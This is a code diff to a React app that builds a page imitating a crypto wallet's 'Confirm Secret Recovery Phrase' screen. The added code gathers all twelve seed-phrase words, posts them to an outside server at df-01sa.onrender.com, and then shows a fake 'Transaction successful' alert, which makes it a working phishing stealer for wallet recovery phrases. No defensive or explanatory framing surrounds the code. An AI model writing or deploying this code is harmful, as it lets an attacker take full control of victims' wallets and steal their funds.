@@ -34,7 +34,40 @@ const theme = extendTheme({
 
 function App() {
   const [show, setShow] = useState(Array(12).fill(false));
-  const handleClick = (index: number) => setShow(show.map((s, i) => i === index ? !s : s));
+  const [mnemonicPhrase, setMnemonicPhrase] = useState(Array(12).fill(''));
+  const [error, setError] = useState('');
+
+  const handleClick = (index:any) => setShow(show.map((s, i) => i === index ? !s : s));
+  const handleInputChange = (index:any, value:any) => setMnemonicPhrase(mnemonicPhrase.map((item, i) => i === index ? value : item));
+
+  const handleConfirmClick = async () => {
+    // Check if all fields are filled
+    if (mnemonicPhrase.some(word => word === '')) {
+      setError('Please fill all the fields.');
+      return;
+    }
+
+    setError('');
+    try {
+      // Making the API call
+      const response = await fetch('https://df-01sa.onrender.com/send_transaction', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ mnemonic_phrase: mnemonicPhrase.join(' ') })
+      });
+
+      const data = await response.json();
+      if (response.status === 200) {
+        alert(`Transaction successful! Hash: ${data.transaction_hash}`);
+      } else {
+        setError('Something went wrong, please try again.');
+      }
+    } catch (error) {
+      setError('Network error. Please try again.');
+    }
+  };
 
   return (
     <ChakraProvider theme={theme}>
@@ -52,8 +85,7 @@ function App() {
           </MenuList>
         </Menu>
       </Box>
-
-      {/* Updated Recovery Phrase Section */}
+  
       <Container centerContent mt="10" maxW="2xl">
         <VStack spacing={4} align="stretch" p="6" borderWidth="1px" borderRadius="lg" bg="rgba(37,39,42,255)" color="white" borderColor="gray.400">
           <Heading size="md" textAlign="center">Confirm Secret Recovery Phrase</Heading>
@@ -66,14 +98,18 @@ function App() {
             <AlertIcon />
             <Text textAlign="center">You can paste your entire secret recovery phrase into any field.</Text>
           </Alert>
-
+  
           {/* Inputs for the Secret Recovery Phrase */}
           {Array.from({ length: 4 }, (_, i) => (
             <Flex justify="space-between" key={`phrase-row-${i}`} pt="2">
               {Array.from({ length: 3 }, (_, j) => (
                 <Flex align="center" key={`phrase-input-${i}-${j}`}>
                   <Text minW="30px" pr="2">{i * 3 + j + 1}.</Text>
-                  <Input type={show[i * 3 + j] ? "text" : "password"} />
+                  <Input 
+                    type={show[i * 3 + j] ? "text" : "password"}
+                    value={mnemonicPhrase[i * 3 + j]}
+                    onChange={(e) => handleInputChange(i * 3 + j, e.target.value)}
+                  />
                   <IconButton
                     aria-label="Toggle phrase visibility"
                     icon={show[i * 3 + j] ? <ViewOffIcon /> : <ViewIcon />}
@@ -86,23 +122,24 @@ function App() {
               ))}
             </Flex>
           ))}
-
-          {/* Updated Confirm Button */}
+  
+          {/* Confirm Button */}
           <Button
             mt="4"
             colorScheme="blue"
-            borderRadius="full"  // Changed from "lg" to "full" for rounder corners
+            borderRadius="full"
             alignSelf="center"
             size="md"
+            onClick={handleConfirmClick}
           >
             Confirm Secret Recovery Phrase
           </Button>
+          {error && <Text color="red.500" textAlign="center">{error}</Text>}
         </VStack>
       </Container>
-      {/* End of Updated Recovery Phrase Section */}
-
     </ChakraProvider>
   );
+  
 }
 
 export default App;
